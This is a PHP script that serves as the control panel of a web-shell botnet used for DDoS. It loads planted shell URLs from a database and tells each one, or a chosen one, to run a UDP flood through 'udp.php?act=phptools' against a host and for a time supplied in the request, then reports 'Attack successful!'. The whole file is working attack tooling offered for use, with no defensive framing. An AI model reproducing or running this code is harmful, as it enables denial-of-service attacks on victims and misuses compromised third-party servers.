<?php

include 'EpiCurl.php';
include 'includes/init.php';
include 'functions.php';

$host = $_GET['host'];
$time = intval($_GET['time']);
$shellid = $_GET['shellid'];
$mc = EpiCurl::getInstance();

$result = mysql_query("SELECT * FROM shells") or die (mysql_error());


while ($row = mysql_fetch_assoc($result))  
{
	if($shellid == "all")
	{
    $shell = trim($row['url']);
    if (strlen($shell) == 0)
        continue;
	$shell .= "/udp.php?act=phptools&host={$host}&time={$time}";

	$ch = curl_init($shell);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_TIMEOUT, 15);
	$curl1 = $mc->addCurl($ch);	     
	if($curl1->code == 200)
		{
			echo "Attack successful!";
		}
	else
		{
			echo "Shell could not be found";
		}
	}
	if($shellid == $row['id'])
	{
		$shell = trim(findURLbyID($shellid));
		if (strlen($shell) == 0)
			continue;
		$shell .= "/udp.php?act=phptools&host={$host}&time={$time}";

		$ch = curl_init($shell);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
		curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		$curl1 = $mc->addCurl($ch);	     
		if($curl1->code == 200)
		{
			echo "Attack successful!";
		}
		else
		{
			echo "Shell could not be found";
		}
	}
}

?>